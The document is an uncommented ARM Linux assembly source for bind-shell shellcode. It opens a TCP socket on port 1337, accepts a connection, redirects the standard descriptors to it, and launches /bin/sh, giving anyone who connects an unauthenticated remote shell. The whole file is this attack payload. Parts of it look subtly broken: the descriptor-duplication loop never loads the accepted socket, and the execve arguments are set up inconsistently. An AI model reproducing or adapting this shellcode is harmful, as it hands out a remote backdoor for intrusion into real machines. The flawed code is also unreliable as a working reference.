.data
sh:
    .ascii  "/bin/sh\0"

.text
.globl _start

_start:
    mov     r7, $0x66
    mov     r0, $0x1

    mov     r1, $0x2
    mov     r2, $0x1
    mov     r3, $0x0
    push    {r1, r2, r3}
    mov     r1, sp
    svc     $0 @ SYS_SOCKET

    mov     r6, r0
    mov     r7, $0x66
    mov     r0, $0x2

    eor     r3, r3
    push    {r3}

    ldr     r4, =0x39050002
    push    {r4}
    mov     r1, sp
   
    mov     r3, $0x10
    
    push    {r1, r3}
    push    {r6}
    mov     r1, sp
    svc     $0  @ SYS_BIND

    mov     r7, $0x66
    mov     r0, $0x4
    mov     r5, $0x0
    push    {r5}
    push    {r6}

    mov     r1, sp
    svc     $0 @ SYS_LISTEN

    mov     r7, $0x66
    mov     r0, $0x5

    mov     r5, $0x0
    push    {r5}
    push    {r5}
    push    {r6}
    mov     r1, sp
    svc     $0 @ SYS_ACCEPT

    mov     r5, r0

    @ SYS_DUP2
    mov     r1, $0x3
    loop:
        subs    r1, r1, $0x1
        mov     r7, $0x3f
        svc     $0
        bne     loop

    ldr     r0, =sh
    mov     r1, r0
    eor     r2, r2
    push    {r2}
    mov     r1, sp
    mov     r7, $11
    swi     $0 @ SYS_EXECVE

    mov     r0, $0
    mov     r7, $1
    svc     $0 @ SYS_EXIT
